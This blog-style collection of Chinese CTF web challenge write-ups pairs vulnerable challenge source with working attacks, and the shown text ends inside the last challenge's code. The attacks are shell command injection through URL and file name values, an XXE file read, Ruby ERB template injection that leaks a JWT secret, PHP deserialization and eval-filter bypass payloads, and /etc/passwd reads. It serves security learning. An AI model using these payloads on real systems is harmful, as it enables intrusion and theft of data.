@[TOC]


# EasyBypass

```php

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";

```

先闭合命令前的双引号，新建自己想要的命令语句，再闭合之后的

`?comm1=";tac /fla?;"&comm2=1`

第一个没过滤分号，能闭合语句，也没过滤双引号，`head`和`tac`


# [SCTF2019]Flag Shop
>[佬的博客](https://blog.csdn.net/Mrs_H/article/details/121493970)

![在这里插入图片描述](https://img-blog.csdnimg.cn/b1e83853e5eb47eab673dea02ff319c9.png)
点一下work会增加金克拉，抓包看一下能改数值么
发现有jwt格式数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/216672d856a04a36b3b2ed05f8ffd800.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/7f9159094e16400bb846391869d2e22e.png)
如果有密钥的话就能伪造jwt了

robots.txt
![在这里插入图片描述](https://img-blog.csdnimg.cn/41b63b565d4542d9ac713734ac43bf2d.png)
```php

require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end


def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end

```

看大佬博客才知道这里是Ruby ERB模板注入
注入方式为`通过<%=%>进行模板注入`

`ruby <%= 7 * 7 %>`返回49

`?name=<%=$'%>&do=<%=$' is working%>&SECRET=
`
alert时返回的内容只匹配七个字符，想写完整的`”SECRET“`获取其内容不太可能，但是有预定义的`$'`可以返回上一次正则匹配内容之后的所有内容

此句话之前的最后一个匹配模式在
```ruby
unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end

```

所以返回的是密钥SECRET
还有一个条件要求`if params[:do] == "#{params[:name][0,7]} is working" then`
所以要传do参数包含name参数的值

最终

`?name=<%=$'%>&do=<%=$'%> is working&SECRET=
`

这样name获取到SECRET值，do也获取到name的值，就能利用后面的
`ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result`
进行密钥弹窗了

![在这里插入图片描述](https://img-blog.csdnimg.cn/6ed2860ae44942cc8ecd682904c52504.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/59b33194ab42446ca7fa004ccaa4c8ab.png)
`79beba3e0c7543b51ad5cca62b1f1c259326cc7a60d69fe2c1db696dd70c62502c34b5000d6995c1c75c908f2ee91f6c767de1fdb79f11905c4d7bd6ea8325b1`

![在这里插入图片描述](https://img-blog.csdnimg.cn/4b7bafe3450d447e80a1fcb20f7d02d1.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/d6adf40f8c6a4ef892fb4ab5882894bc.png)
返回了一个新的jwt，解密
![在这里插入图片描述](https://img-blog.csdnimg.cn/c73ebb121afc4b48a35bf40bced121d4.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a843af32273c4dbd90fbceade8191359.png)
# [BSidesCF 2019]SVGMagic

>[BUUCTF--[BSidesCF 2019]SVGMagic](https://blog.csdn.net/qq_46263951/article/details/118999618)

SVG图像使用XML文件格式

![在这里插入图片描述](https://img-blog.csdnimg.cn/b5c2c3468505456cbc219af378db7bad.png)
构造xxe

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>

```

# [极客大挑战 2020]Greatphp

```php

<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>

```

一开始以为是数组绕过，但是此处在类中，需要使用PHP内置类进行绕过
学习大佬博客
>[PHP 原生类的利用小结](https://xz.aliyun.com/t/9293#toc-5)

md5()、hash()、eval()所需要的参数都是string类型，如果传入object就会调用其中的`toString`方法

```php

<?php

class SYCLOVER {
    public $syc;
    public $lover;
    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
/* 
或使用[~(取反)][!%FF]的形式，
即: $str = "?><?=include[~".urldecode("%D0%99%93%9E%98")."][!.urldecode("%FF")."]?>";    

$str = "?><?=include $_GET[_]?>"; 
*/
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));

?>

```

这里payload前加了`?>`是因为Error返回的信息在代码前还有类似于`Error:`的前缀，传到`eval`函数中就会编程`eval("Error<?xxxxxxx?>")`会产生报错，所以先闭合

```php
O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A79%3A%22C%3A%5CUsers%5CSprint%2351264%5CDesktop%5Cpayload%5Cbuuctf%5C%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98+2020%5DGreatphp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A20%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A79%3A%22C%3A%5CUsers%5CSprint%2351264%5CDesktop%5Cpayload%5Cbuuctf%5C%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98+2020%5DGreatphp.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A20%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D
```


# [GYCTF2020]Easyphp【留坑-反序列化】

www.zip下载源码

update.php
```php

<?php
require_once('lib.php');
echo '<html>
<meta charset="utf-8">
<title>update</title>
<h2>这是一个未完成的页面，上线时建议删除本页面</h2>
</html>';
if ($_SESSION['login']!=1){
	echo "你还没有登陆呢！";
}
$users=new User();
$users->update();
if($_SESSION['login']===1){
	require_once("flag.php");
	echo $flag;
}

?>

```
登陆成功即可获取flag，此处会创建一个新用户类，执行update()函数
看一下lib.php

```php

<?php
error_reporting(0);
session_start();
function safe($parm){//存在增字符逃逸
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
        $mysqli=new dbCtrl();
        $this->id=$mysqli->login('select id,password from user where username=?');
        if($this->id){
        $_SESSION['id']=$this->id;
        $_SESSION['login']=1;
        echo "你的ID是".$_SESSION['id'];
        echo "你好！".$_SESSION['token'];
        echo "<script>window.location.href='./update.php'</script>";
        return $this->id;
        }
    }
}
    public function update(){//update函数获取新的age和nickname
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){//存在信息更新点
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));//此处调用safe进行过滤
    }
    public function __destruct(){
        return file_get_contents($this->nickname);//危，析构时获取nickname指定文件内容
    }
    public function __toString()
    {
        $this->nickname->update($this->age);//
        return "0-0";
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }
}
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this->sql;
    }
}


```



# [HarekazeCTF2019]Avatar Uploader 1

下载源码

```php

<?php
error_reporting(0);

require_once('config.php');
require_once('lib/util.php');
require_once('lib/session.php');

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);

// check whether file is uploaded
if (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {
  error('No file was uploaded.');
}

// check file size
if ($_FILES['file']['size'] > 256000) {//检查大小
  error('Uploaded file is too large.');
}

// check file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png'])) {
  error('Uploaded file is not PNG format.');
}

// check file width/height
$size = getimagesize($_FILES['file']['tmp_name']);
if ($size[0] > 256 || $size[1] > 256) {
  error('Uploaded image is too large.');
}
if ($size[2] !== IMAGETYPE_PNG) {
  // I hope this never happens...
  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');
}

// ok
$filename = bin2hex(random_bytes(4)) . '.png';
move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);

$session->set('avatar', $filename);
flash('info', 'Your avatar has been successfully updated!');
redirect('/');

```
需要上传宽高小于256px并且mimetype为PNG但是实际上又不是png图片的文件

>[BUUCTF:[HarekazeCTF2019]Avatar Uploader 1](https://blog.csdn.net/m0_46481239/article/details/108072988)

finfo_file获取文件第一行信息，但是getimagesize函数不行
将一个png图片除第一行信息以外内容全部删除
![在这里插入图片描述](https://img-blog.csdnimg.cn/62708f5f2f264b9698b7a8c90cc2addc.png)

获取不到任何信息，变量都被赋值为`NULL`，但是比较还是成功的
![在这里插入图片描述](https://img-blog.csdnimg.cn/2a2cbc19c2b341c1b0f33b1a771c40f8.png)
# [FireshellCTF2020]Caas

emm，贴上别人博客吧，include预编译报错
`#include "/etc/passwd"`

![在这里插入图片描述](https://img-blog.csdnimg.cn/acc6cd5ff39d451e9c45f5f793520f9b.png)
`include "/flag"`

![在这里插入图片描述](https://img-blog.csdnimg.cn/6fe40f4308d24093a620b2e9c178f5fe.png)
# [ISITDTU 2019]EasyPHP
>[[ISITDTU 2019]EasyPHP-一夜至秋](https://blog.csdn.net/m0_62905261/article/details/127143195)
```php
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>

```

禁用`x00-x20`字符，单引号双引号、`反引号$&.,`

`count_chars`模式3
![在这里插入图片描述](https://img-blog.csdnimg.cn/44fc134aad394e678f6ed82ddcf8a795.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/73b08d0f9e1e41ada6531616efdd1034.png)
返回指定字符串中所有使用过的不同字符，按顺序排列

要求所有使用过的字符不超过13种。

取反绕过：
phpinfo
`(~%8F%97%8F%96%91%99%90)();`
发现页面没回显
使用异或`%FF`绕过

`((%8F%97%8F%96%91%99%90)^(%FF%FF%FF%FF%FF%FF%FF))();`

```php

<?php


$_ = "phpinfo";
$__ = "((%8F%97%8F%96%91%99%90)^(%FF%FF%FF%FF%FF%FF%FF))();";

echo strlen(count_chars(urldecode($__),3));
?>
# 输出11，长度符合
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/a0db84d1547544dfacc95f9c17dfaa59.png)
找disable_functions

`	pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,`
禁用了众多命令执行函数

``

```php

$a = "var_dump";
$b = "scandir";
$c = ".";

echo urlencode(~$a)."\n";
echo urlencode(~$b)."\n";
echo urlencode(~$c)."\n";

(%89%9E%8D%A0%9B%8A%92%8F)^(%FF%FF%FF%FF%FF%FF%FF%FF)
(%8C%9C%9E%91%9B%96%8D)^(%FF%FF%FF%FF%FF%FF%FF)
(%D1)^(%FF)
```
var_dump(scandir(.))
`(%89%9E%8D%A0%9B%8A%92%8F)^(%FF%FF%FF%FF%FF%FF%FF%FF)((%8C%9C%9E%91%9B%96%8D)^(%FF%FF%FF%FF%FF%FF%FF)((%D1)^(%FF)));`

用var_dump有18种字符，用print_r有16种字符
print(scandir(.))
`(%8F%8D%96%91%8B%A0%8D)^(%FF%FF%FF%FF%FF%FF%FF)((%8C%9C%9E%91%9B%96%8D)^(%FF%FF%FF%FF%FF%FF%FF)((%D1)^(%FF)));
`

```php

$payload = "(%8F%8D%96%91%8B%A0%8D)^(%FF%FF%FF%FF%FF%FF%FF)((%8C%9C%9E%91%9B%96%8D)^(%FF%FF%FF%FF%FF%FF%FF)((%D1)^(%FF)));";

echo strlen(count_chars($payload,3));
```

>这个时候我们可以使用异或的方法通过已存在的字符构造出来字符来代替三个其中的字符，这样长度就从16缩到了13，选择使用pscadi来代替ntr



由前辈思路顺延，使用已存在字符异或出多出来的字符
```python

str = 'pscadi'
target = 'ntr'
 
for m in target:
    for a in str:
        for b in str:
            for c in str:
                if ord(a) ^ ord(b) ^ ord(c) == ord(m):
                    print("{} = {}^{}^{}".format(m, a, b, c))

```


```php

// n = c^d^i
// t = s^c^d
// r = p^c^a

因为 1 = 0^1^0  且  1^1 = (0^1)^(1^1)^(0^1)
还有 1^1^1^1=0=1^1 
则可构造payload

echo urlencode("c"^urldecode("%FF"))."\n"; //c %9C
echo urlencode("d"^urldecode("%FF"))."\n"; //d %9B
echo urlencode("i"^urldecode("%FF"))."\n"; //i %96
echo urlencode("s"^urldecode("%FF"))."\n"; //s %8C
echo urlencode("p"^urldecode("%FF"))."\n"; //p %8F
echo urlencode("a"^urldecode("%FF"))."\n"; //a %9E
print(urldecode("%8F%8F%96%9C%8C%A0%8F")^urldecode("%FF%9C%FF%9B%9C%FF%9C")^urldecode("%FF%9E%FF%96%9B%FF%9E")^urldecode("%FF%FF%FF%FF%FF%FF%FF"));
# print_r，现在是在利用print_r取反后的字符串在进行操作，只需要将以上取反出来的字符将在对应位置替换即可

print(urldecode('%8C%9C%9E%9C%9B%96%9E')^urldecode('%FF%FF%FF%9B%FF%FF%9C')^urldecode('%FF%FF%FF%96%FF%FF%8F')^urldecode('%FF%FF%FF%FF%FF%FF%FF'));
#scandir
?>

```
所以最终构造payload为
`?_=((%8F%9E%96%9C%9C%A0%9E)^(%FF%9C%FF%9B%9B%FF%9C)^(%FF%8F%FF%96%8C%FF%8F)^(%FF%FF%FF%FF%FF%FF%FF))(((%8C%9C%9E%9C%9B%96%9E)^(%FF%FF%FF%9B%FF%FF%9C)^(%FF%FF%FF%96%FF%FF%8F)^(%FF%FF%FF%FF%FF%FF%FF))((%D1)^(%FF)));`


![在这里插入图片描述](https://img-blog.csdnimg.cn/2832a16e44c341958df3a842f86f9063.png)
使用`reaadfile(end(scandir(.)))`
```php

<?php
$c = "readfile";
$d = "scandir";
$e = ".";

echo urlencode(~$c)."\n".urlencode(~$d)."\n".urlencode(~$e);

# %8D%9A%9E%9B%99%96%93%9A
# %8C%9C%9E%91%9B%96%8D
# %D1
?>
```

```php

$b = "readfile(end(scandir(.)))";

$payload = "((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%91%9B)^(%FF%FF%FF))(((%8C%9C%9E%91%9B%96%8D)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));";

var_dump(count_chars(urldecode($payload),3));

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a6369033f7b44a3b88afe37a7088b511.png)

又超3个字符
直接拉大佬的payload了
```php
<?php
echo(urldecode('%8D%8D%8D%8D%8D%8D%9E%8D')^urldecode('%9A%8D%8D%8D%8D%8D%9B%8D')^urldecode('%9A%9A%9E%9B%99%96%96%9A')^urldecode('%FF%FF%FF%FF%FF%FF%FF%FF'));
echo nl2br("\n");
echo(urldecode('%8D%9E%8D')^urldecode('%8D%99%8D')^urldecode('%9A%96%9B')^urldecode('%FF%FF%FF'));
echo nl2br("\n");
echo(urldecode('%8D%9E%8D%9E%8D%8D%8D')^urldecode('%9A%9B%8D%99%8D%8D%9A')^urldecode('%9B%99%9E%96%9B%96%9A')^urldecode('%FF%FF%FF%FF%FF%FF%FF'));
echo nl2br("\n");
echo(urldecode('%D1')^urldecode('%FF'));
?>

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/eb7b1a101b484e77a846c890e3abd86d.png)
唉

# [N1CTF 2018]eating_cms
register.php注册

发现url长这样
`buuoj.cn:81/user.php?page=guest`
尝试伪协议读源码`?page=php://filter/read=convert.base64-encode/resource=user.php`

发现没结果，可能是自动加.php后缀，于是改为
`?page=php://filter/read=convert.base64-encode/resource=user`
user.php

```php

<?php
require_once("function.php");
if( !isset( $_SESSION['user'] )){
    Header("Location: index.php");

}
if($_SESSION['isadmin'] === '1'){
    $oper_you_can_do = $OPERATE_admin;
}else{
    $oper_you_can_do = $OPERATE;
}
//die($_SESSION['isadmin']);
if($_SESSION['isadmin'] === '1'){
    if(!isset($_GET['page']) || $_GET['page'] === ''){
        $page = 'info';
    }else {
        $page = $_GET['page'];
    }
}
else{
    if(!isset($_GET['page'])|| $_GET['page'] === ''){
        $page = 'guest';
    }else {
        $page = $_GET['page'];
        if($page === 'info')
        {
//            echo("<script>alert('no premission to visit info, only admin can, you are guest')</script>");
            Header("Location: user.php?page=guest");
        }
    }
}
filter_directory();
//if(!in_array($page,$oper_you_can_do)){
//    $page = 'info';
//}
include "$page.php";
?>
```

index.php

```php

<?php
require_once "function.php";
if(isset($_SESSION['login'] )){
    Header("Location: user.php?page=info");
}
else{
    include "templates/index.html";
}
?>
```
info.php
```php

<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly ");
}
include "templates/info.html";
?>
```

function.php
```php

<?php
session_start();
require_once "config.php";
function Hacker()
{
    Header("Location: hacker.php");
    die();
}


function filter_directory()
{
    $keywords = ["flag","manage","ffffllllaaaaggg"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function filter_directory_guest()
{
    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function Filter($string)
{
    global $mysqli;
    $blacklist = "information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password";
    $whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><";
    for ($i = 0; $i < strlen($string); $i++) {
        if (strpos("$whitelist", $string[$i]) === false) {
            Hacker();
        }
    }
    if (preg_match("/$blacklist/is", $string)) {
        Hacker();
    }
    if (is_string($string)) {
        return $mysqli->real_escape_string($string);
    } else {
        return "";
    }
}

function sql_query($sql_query)
{
    global $mysqli;
    $res = $mysqli->query($sql_query);
    return $res;
}

function login($user, $pass)
{
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
    if ($res->num_rows) {
        $data = $res->fetch_array();
        $_SESSION['user'] = $data[username_which_you_do_not_know];
        $_SESSION['login'] = 1;
        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];
        return true;
    } else {
        return false;
    }
    return;
}

function updateadmin($level,$user)
{
    $sql = "update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' ";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
//    die($res);
    if ($res == 1) {
        return true;
    } else {
        return false;
    }
    return;
}

function register($user, $pass)
{
    global $mysqli;
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')";
    $res = sql_query($sql);
    return $mysqli->insert_id;
}

function logout()
{
    session_destroy();
    Header("Location: index.php");
}

?>
```

尝试伪协议读取ffffllllaaaaggg被waf拦截

```php

    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
```

>此处使用parse_url函数，所以当我们访问//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg，会解析错误，返回 false

又学到新姿势了

```php

#ffffllllaaaaggg.php
<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly");
}else {
    echo "you can find sth in m4aaannngggeee";
}
?>
```

```php

#m4aaannngggeee.php
<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly");
}
include "templates/upload.html";

?>
```
访问到m4aaannngggeee之后,`/user.php?page=m4aaannngggeee`
![在这里插入图片描述](https://img-blog.csdnimg.cn/09191dda035b48f1afbc24aba02f7d4f.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d9690d0a93e1434b816d790af329f8da.png)

上传后显示图像base64内容，注意到上传点的文件名

`/user.php?page=php://filter/convert.base64-encode/resource=upllloadddd`
```php


<?php
$allowtype = array("gif","png","jpg");
$size = 10000000;
$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
$filename = $_FILES['file']['name'];
if(is_uploaded_file($_FILES['file']['tmp_name'])){
    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
        die("error:can not move");
    }
}else{
    die("error:not an upload file！");
}
$newfile = $path.$filename;
echo "file upload success<br />";
echo $filename;
$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
echo "<img src='data:image/png;base64,".$picdata."'></img>";
if($_FILES['file']['error']>0){
    unlink($newfile);
    die("Upload file error: ");
}
$ext = array_pop(explode(".",$_FILES['file']['name']));
if(!in_array($ext,$allowtype)){
    unlink($newfile);
}
?>
```

注意到这么一段`$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");`
这里文件名可以拼接命令执行
`2.jpg;ls;#`

![在这里插入图片描述](https://img-blog.csdnimg.cn/ee2eae5afb774839b08b42947c659bb8.png)
输入`ls /`发现被替换为空
![在这里插入图片描述](https://img-blog.csdnimg.cn/13d5a8eaa22a40a0893da7247a570138.png)
`2.jpg;cd ..;ls;#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/ec389c1dbe1e4a32a19923a82d43088c.png)`2.jpg;cd ..;cat flag_233333;#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/ee84897cf77c42f8a44a3ebd776a4675.png)

# [GYCTF2020]Ez_Express【留坑-nodejs原型链污染】
>2023.9.28留坑

点注册界面空的
![在这里插入图片描述](https://img-blog.csdnimg.cn/cdc00d3049d84c4caf3fd95026137056.png)
查看源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/87a8e55d35da47f8b409f7f19902dd6e.png)

```js

var express = require('express');
var router = express.Router();
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
const clone = (a) => {
  return merge({}, a);
}
function safeKeyword(keyword) {
  if(keyword.match(/(admin)/is)) {
      return keyword
  }

  return undefined
}

router.get('/', function (req, res) {
  if(!req.session.user){
    res.redirect('/login');
  }
  res.outputFunctionName=undefined;
  res.render('index',data={'user':req.session.user.user});
});


router.get('/login', function (req, res) {
  res.render('login');
});



router.post('/login', function (req, res) {
  if(req.body.Submit=="register"){
   if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/'); 
  }
  else if(req.body.Submit=="login"){
    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end("<script>alert('error passwd');history.go(-1);</script>")
    }
  
  }
  res.redirect('/'); ;
});
router.post('/action', function (req, res) {
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
module.exports = router;


```



# [强网杯 2019]Upload

注册登录后有文件上传点
![在这里插入图片描述](https://img-blog.csdnimg.cn/3410ded74be349de92d11c62a7c9a0d1.png)

上传一个图片
![在这里插入图片描述](https://img-blog.csdnimg.cn/181dc3f34f014ed392fc4d37a80f3fb1.png)
抓包看一下，

![在这里插入图片描述](https://img-blog.csdnimg.cn/9d4d5d9532de4a968087727816787ca8.png)
解码后是：
`a:5:{s:2:"ID";i:3;s:8:"username";s:3:"asd";s:5:"email";s:11:"asd@asd.asd";s:8:"password";s:32:"7815696ecbf1c96e6894b779456d330e";s:3:"img";s:79:"../upload/c55e0cb61f7eb238df09ae30a206e5ee/f121d135f39f03e48da5fe5e8ced5b0a.png";}`


`dirsearch -u xxxxx --delay 0.7 -t 5`这个线程扫不容易爆
`www.tar.gz`

controller下几个文件

`Index.php`有反序列化点
```php

<?php
namespace app\web\controller;
use think\Controller;

class Index extends Controller
{
    public $profile;
    public $profile_db;

    public function index()
    {
        if($this->login_check()){
            $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home";
            $this->redirect($curr_url,302);
            exit();
        }
        return $this->fetch("index");
    }

    public function home(){
        if(!$this->login_check()){
            $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
            $this->redirect($curr_url,302);
            exit();
        }

        if(!$this->check_upload_img()){
            $this->assign("username",$this->profile_db['username']);
            return $this->fetch("upload");
        }else{
            $this->assign("img",$this->profile_db['img']);
